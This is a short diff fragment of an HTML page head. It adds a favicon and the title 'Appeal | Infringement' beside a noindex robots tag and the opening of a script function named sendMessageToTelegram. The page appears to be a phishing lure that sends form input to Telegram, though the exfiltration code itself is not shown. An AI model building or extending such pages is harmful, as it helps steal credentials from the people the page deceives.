@@ -7,6 +7,8 @@
     <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="head.gif">
+    <title>Appeal | Infringement</title>
     <script>
 
         function sendMessageToTelegram() {
